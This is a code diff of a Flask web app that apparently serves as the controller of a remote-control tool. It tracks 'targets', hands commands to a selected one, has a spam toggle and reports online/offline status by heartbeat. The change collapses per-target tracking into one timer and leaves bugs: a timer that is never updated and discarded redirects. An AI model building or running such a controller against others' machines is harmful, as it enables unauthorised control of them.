@@ -8,15 +8,10 @@ from zoneinfo import ZoneInfo
 app = Flask(__name__)
 firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
-startTime = {}
+startTime = time()
 spam = False
 selected_user = "93"
-TARGETS = None
 STATIC_FOLDER = os.path.join("static")
-with open(os.path.join(STATIC_FOLDER,"users.json"),"r") as file:
-	TARGETS = json.load(file)["users"]
-for TARGET in TARGETS:
-	startTime[TARGET] = time()
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
 
@@ -44,11 +39,10 @@ def terminal():
     ss = data1["spamToggleState"]["state"]
     sc = data1["spamToggleState"]["color"]
     if not firstReload:
-        print(startTime[selected_user])
-        if time() - startTime[selected_user] <= 2.5:
+        if time() - startTime <= 2.5:
             state = "Online"
             color = "green"
-        elif time() - startTime[selected_user] > 2.5:
+        elif time() - startTime > 2.5:
             state = "Offline"
             color = "red"
     if os.path.exists(tasks_file):
@@ -78,11 +72,10 @@ def command():
     global selected_user
     global spam
     if request.method == "POST":
-        
         user = request.get_json()
         user = user.get("user")
-        startTime[user] = time()
-        if selected_user == user:          
+        if selected_user == user:
+            startTime = time()
             cmd = ""
             message_file = os.path.join(STATIC_FOLDER, "message.txt")
             tasks_file = os.path.join(STATIC_FOLDER, "tasks.json")
@@ -169,21 +162,14 @@ def url():
 
 @app.route("/status", methods=["POST", "GET"])
 def status():
-    global TARGET
-    global selected_user
     if request.method == "GET":
-        data = {}
-        if time() - startTime[selected_user] >= 2.5:
-        	data[selected_user] = "offline"
+        deltaTime = time() - startTime
+        if deltaTime >= 2.5:
+            redirect("/")
+            return "offline"
         else:
-        	data[selected_user] = "online"
-        for target in TARGETS:
-	        deltaTime = time() - startTime[target]
-	        if deltaTime >= 2.5:
-	            data[target] = "offline"
-	        else:
-	        	data[target] = "online"
-    return data	       
+            redirect("/")
+            return "online"
 
 @app.route("/add-task", methods=["POST", "GET"])
 def schedule():
